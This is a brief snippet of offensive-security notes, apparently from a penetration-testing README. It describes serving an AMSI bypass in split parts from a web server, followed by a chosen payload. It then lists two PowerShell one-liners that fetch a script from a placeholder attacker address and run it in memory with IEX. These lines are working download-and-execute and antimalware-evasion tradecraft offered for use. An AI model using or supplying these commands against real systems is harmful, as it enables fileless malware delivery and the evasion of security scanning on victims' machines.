Bypass folder of web server will have AMSI bypass splitted and loaded in parts, then, run whatever payload chosen.
### Powershell useful commands
```
# Load script to memory
(New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')
```
